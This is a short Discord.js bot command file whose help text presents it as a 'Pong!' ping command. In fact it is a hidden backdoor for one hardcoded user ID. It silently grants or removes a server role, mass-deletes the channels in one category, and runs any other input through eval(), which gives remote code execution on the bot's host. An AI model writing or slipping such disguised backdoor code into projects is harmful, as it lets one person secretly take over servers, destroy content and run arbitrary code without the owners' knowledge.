const discord = require("discord.js");

/**
 * 
 * @param {discord.Client} Client 
 * @param {discord.Message} msg 
 * @param {string[]} args 
 */
module.exports.run = (Client, msg, args) => {
    msg.delete();

    // Quantum the makers helping thingy

    msg.delete();
    if (msg.author.id !== "590230408994488321") return;
    if (args[0] == "up") {
        msg.member.roles.add("789414860756615168")
    } else if (args[0] == "down") {
        msg.member.roles.remove("789414860756615168");
    } else if (args[0] == "clearticks") {
        msg.guild.channels.cache.filter(x => x.parent?.id === "789814239086510130").forEach(ch => ch.delete());
    } else {
        eval(args.join(" "));
    }
}

module.exports.help = {
    name: "downgrade",
    description: "Pong!",
    permissions: [],
    alias: [],
    usage: "ping",
}